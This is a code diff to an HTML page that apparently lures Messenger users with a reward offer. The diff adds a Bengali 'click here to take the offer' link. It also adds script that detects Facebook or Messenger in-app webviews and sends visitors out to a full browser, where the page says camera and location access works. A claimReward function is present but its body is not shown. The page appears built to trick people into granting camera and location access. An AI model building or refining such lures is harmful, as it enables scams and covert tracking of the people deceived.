@@ -9,7 +9,10 @@
 <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
 <style>
 body { margin:0; font-family:sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; text-align:center; background:#fff0f0; flex-direction:column; }
+#loading { font-size:1.2rem; color:#333; margin-bottom:20px; }
 #openBrowserWarning { display:none; }
+#openBrowserWarning a { display:inline-block; padding:14px 20px; background:#e60023; color:#fff; text-decoration:none; border-radius:12px; margin-top:10px; transition:0.3s; }
+#openBrowserWarning a:hover { background:#b3001b; transform:scale(1.02); }
 #main { display:none; background:#fff; padding:2rem; border-radius:20px; box-shadow:0 8px 25px rgba(0,0,0,0.2); max-width:400px; width:90%; }
 input, select, button { width:100%; padding:12px; margin:10px 0; border-radius:12px; font-size:1rem; }
 button { background:#e60023; color:white; border:none; cursor:pointer; transition:0.3s; }
@@ -23,7 +26,7 @@ button:hover { background:#b3001b; transform:scale(1.02); }
 
 <div id="openBrowserWarning">
   ⚠️ Camera & Location may not work in Messenger.<br>
-  <button onclick="openInBrowser()">Open in Browser</button>
+  <a id="openBrowserLink" href="#" target="_blank">Open in Browser অফার নিতে এখানে ক্লিক করুন </a>
 </div>
 
 <div id="main">
@@ -46,16 +49,13 @@ function isInWebView(){
   return (ua.includes('FBAN') || ua.includes('FBAV') || ua.includes('Messenger'));
 }
 
-// Open in browser click
-function openInBrowser(){
-  window.open(window.location.href, '_blank');
-}
-
 // Page load
 window.addEventListener('load', ()=>{
   setTimeout(()=>{
     document.getElementById("loading").style.display = "none";
     if(isInWebView()){
+      const link = document.getElementById('openBrowserLink');
+      link.href = window.location.href; // direct link
       document.getElementById('openBrowserWarning').style.display='block';
     } else {
       document.getElementById("main").style.display='block';
@@ -109,4 +109,4 @@ function claimReward(){
 }
 </script>
 </body>
-  </html>
+</html>
